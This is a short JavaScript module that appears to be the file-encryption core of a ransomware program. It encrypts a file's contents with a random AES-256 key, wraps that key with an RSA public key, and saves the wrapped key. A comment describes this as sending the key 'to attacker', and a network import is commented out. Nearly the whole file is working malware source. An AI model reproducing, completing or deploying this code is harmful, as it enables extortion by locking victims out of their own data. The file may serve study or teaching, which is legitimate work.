// import axios from "axios";
import { createCipheriv, publicEncrypt, randomBytes } from "crypto";
import { readFileSync } from "fs";
import { join } from "path";
import { writeFileContent } from ".";
const publicKeyBuffer = readFileSync("./public.pem");

const AES_ALGORITHM = "aes-256-ctr";

/**
 * Function encrypts given input buffer using random AES-256 bit key.
 * Returns key buffer and encrypted message buffer
 *
 * @param {Buffer} message
 */
function aesEncrypt(message) {
  const key = randomBytes(256 / 8);
  const iv = Buffer.alloc(16);
  const aes = createCipheriv(AES_ALGORITHM, key, iv);
  const encryptedBuffer = aes.update(message);
  aes.final();

  return { message: encryptedBuffer, key };
}

/**
 * Function encrypts message with given public key.
 *
 * @param {Buffer} publicKey
 * @param {Buffer} message
 */
function rsaEncrypt(publicKey, message) {
  return publicEncrypt(publicKey, message);
}
function encrypt(file) {
  // Encrypt file buffer with AES, get the encrypted buffer and encryption key back
  const fileToEncrypt = readFileSync(file);
  const { message: encryptedFileBuffer, key: encryptionKey } =
    aesEncrypt(fileToEncrypt);
  return { encryptedFileBuffer, encryptionKey };
}

export default async (fileToEncript) => {
  const { encryptedFileBuffer, encryptionKey } = encrypt(fileToEncript);
  // Encrypt and send key to attacker (and save it to file, for test reasons)
  const encryptedKey = rsaEncrypt(publicKeyBuffer, encryptionKey);
  const directoryPath = join(__dirname).replace("/src", "");
  await writeFileContent(
    `${directoryPath}/keys/${fileToEncript}_decrypter`,
    encryptedKey
  );
  return encryptedFileBuffer;
};
